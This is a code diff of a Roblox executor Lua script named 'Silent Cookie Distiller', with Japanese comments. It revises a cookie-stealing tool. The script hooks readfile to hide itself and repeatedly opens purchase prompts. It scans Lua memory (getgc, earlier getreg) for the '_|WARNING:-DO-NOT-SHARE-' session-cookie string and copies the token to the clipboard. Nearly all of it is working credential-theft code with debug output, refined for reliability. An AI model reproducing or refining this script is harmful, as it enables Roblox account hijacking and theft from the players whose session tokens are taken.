@@ -1,12 +1,11 @@
--- [[ Project: Silent Cookie Distiller - Debug/Final ]]
--- ログが出るか、MarketplaceServiceが動くかだけに集中した構成
-
-print("[DEBUG] Script Started") -- これすら出ない場合はDeltaの貼り付けミス
+-- [[ Project: Silent Cookie Distiller - Lightweight ]]
+print("[DEBUG] System Booting...")
 
 local player = game:GetService("Players").LocalPlayer
-local MS = cloneref(game:GetService("MarketplaceService"))
+-- clonerefを使わず、直接呼び出しでフリーズを回避
+local MS = game:GetService("MarketplaceService")
 
--- STEP 1: セキュリティ偽装 (hookfunctionを使用)
+-- 1. セキュリティ偽装 (hookのみ)
 pcall(function()
     local old_read
     old_read = hookfunction(readfile, function(path)
@@ -15,36 +14,43 @@ pcall(function()
         end
         return old_read(path)
     end)
-    print("[DEBUG] Hook Applied")
+    print("[DEBUG] Hook Set")
 end)
 
--- STEP 2: クッキー監視 (getregを使用：GCより確実な場合がある)
-task.spawn(function()
-    print("[DEBUG] Scanning Registry...")
+-- 2. 抽出関数（必要な時だけ呼ぶ）
+local function fast_capture()
+    print("[DEBUG] Quick Scanning...")
     local prefix = "_|WARNING:-DO-NOT-SHARE-"
-    
-    while true do
-        -- getreg() は Lua のレジストリをすべて覗く。より深い場所まで探せる。
-        for _, v in pairs(getreg()) do
-            if type(v) == "string" and string.sub(v, 1, #prefix) == prefix then
-                local _, pos = string.find(v, "|_", 1, true)
-                if pos then
-                    setclipboard(string.sub(v, pos + 1))
-                    print("********************************")
-                    print("SUCCESS: Captured to clipboard!")
-                    print("********************************")
-                    return 
-                end
+    -- getgc(true) ではなく、通常の getgc() で文字列だけを狙う
+    for _, v in pairs(getgc()) do
+        if type(v) == "string" and string.find(v, prefix, 1, true) then
+            local _, pos = string.find(v, "|_", 1, true)
+            if pos then
+                setclipboard(string.sub(v, pos + 1))
+                print("--------------------------------")
+                print("SUCCESS: Captured to clipboard!")
+                print("--------------------------------")
+                return true
             end
         end
-        task.wait(4)
     end
-end)
+    print("[DEBUG] Not found yet. Try opening the UI again.")
+    return false
+end
 
--- STEP 3: 強制トリガー
-task.wait(2)
-print("[DEBUG] Opening UI...")
-pcall(function()
-    -- 確実に購入UIが出るはずのメソッド
-    MS:PromptProductPurchase(player, 9999) 
+-- 3. トリガー（5秒おきにUIを表示し、その直後にスキャン）
+task.spawn(function()
+    while true do
+        print("[DEBUG] Triggering UI...")
+        pcall(function()
+            -- 軽いプロンプト（ID 0）を使用
+            MS:PromptProductPurchase(player, 0)
+        end)
+        
+        -- UIが開くのを少し待ってからスキャンを実行
+        task.wait(2)
+        if fast_capture() then break end
+        
+        task.wait(8) -- 10秒に1回の間隔でリトライ（フリーズ防止）
+    end
 end)
